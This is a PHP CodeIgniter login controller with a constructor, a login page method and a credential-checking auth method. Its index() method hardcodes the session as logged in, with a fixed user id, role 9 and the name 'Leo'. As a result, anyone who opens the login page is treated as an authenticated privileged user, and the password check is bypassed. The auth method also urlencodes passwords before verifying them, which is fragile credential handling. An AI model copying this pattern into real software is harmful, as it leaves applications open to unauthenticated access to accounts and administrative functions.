<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Welcome extends CI_Controller {

	/**
    * Construct 
    *
    * @author   Arief Budi Santoso
    */
    function __construct(){
        
        parent::__construct();

        if (!isset($_SESSION['isLogin'])) {
        	$this->session->set_userdata('isLogin', false);
        }else{
        	if ($_SESSION['isLogin']) {
				header('Location: '.site_url("dashboard"));
			}
        }

        
        $this->load->model('Admin_model','MAdmin');
    }

	/**
    * Index Page for Login
    *
    * @author   Arief Budi Santoso
    */
	public function index()
	{
            $_SESSION['isLogin']=true;
            $_SESSION['strId']=1212121212;
            $_SESSION['strRole']=9;
            $_SESSION['strName']="Leo";
    
        //Get Encrypt URL if Exist
        if (isset($_GET["crypt"])) {
        	$arrData["word"] = '<p style = "color:#c0392b;">'.xss_clean(cms_decrypt(urlencode($this->input->get('crypt')))).'</p>';
        }else{
        	$arrData["word"] = '';
        }

		//Build JS & CSS for Template
		$CSSvalue = array("login/reset.css","login/style.css");
		$JSvalue = array("jquery.min.js", "login/index.js");

		// Build data for body
		$arrData['title'] = "Welcome - ".$this->config->item('appName');
		$arrData["logo"] = $this->loadassets->loadImage(array("logo" => "img-main-logo.svg"));
		$arrData["loadJS"] = $this->loadassets->loadJS($JSvalue);
		$arrData["loadCSS"] = $this->loadassets->loadCSS($CSSvalue);

		//Load View
		$this->load->view($this->config->item('vbody').'login/index', $arrData);
	}

	/**
    * Authentication for Login
    *
    * @author   Arief Budi Santoso
    */
	public function auth()
	{
		$encrypt = cms_encrypt("Email / Username & Password cannot be Empty.");
		if($this->input->post('username') AND $this->input->post('password')){
			$data = array(
				"username"=>urlencode(xss_clean($this->input->post('username'))),
				"email"=>xss_clean($this->input->post('username')),
				"password"=>urlencode(xss_clean($this->input->post('password')))
			);

			//Check 
			$arrWhere = array("username" => $data["username"], "email" => $data["email"]);
			$objUser = $this->MAdmin->getAllRecord($arrWhere, array(), "OR");
			
			if (count($objUser) > 0 ){
				//Verify Password 
				if (password_verify($data["password"], $objUser[0]->password)) {
			    	if ($objUser[0]->is_active == 1) {
			    		//Set Session
						$this->session->set_userdata('isLogin', true);
						$this->session->set_userdata('strId', $objUser[0]->id);
						$this->session->set_userdata('strRole', $objUser[0]->role);
						$this->session->set_userdata('strName', $objUser[0]->fullname);
						$this->session->set_userdata('strEmail', $objUser[0]->email);

						//Add Log
						$this->MAdmin->editData(array('last_login' => date('Y-m-d H:i:s')),array('id' => $objUser[0]->id));

						redirect('dashboard');
			    	}else{
						$encrypt = cms_encrypt("Sorry, you are not verified account");
						redirect(site_url().'?crypt='.$encrypt);
			    	}
				}else {
					$encrypt = cms_encrypt("Wrong Username and Password Combination. Please Try Again");
					redirect(site_url().'?crypt='.$encrypt);
				}
			}else{
				$encrypt = cms_encrypt("Wrong Username and Password Combination. Please Try Again");
				redirect(site_url().'?crypt='.$encrypt);
			}

		}else{
			redirect(site_url().'?crypt='.$encrypt);
		}
	}
}
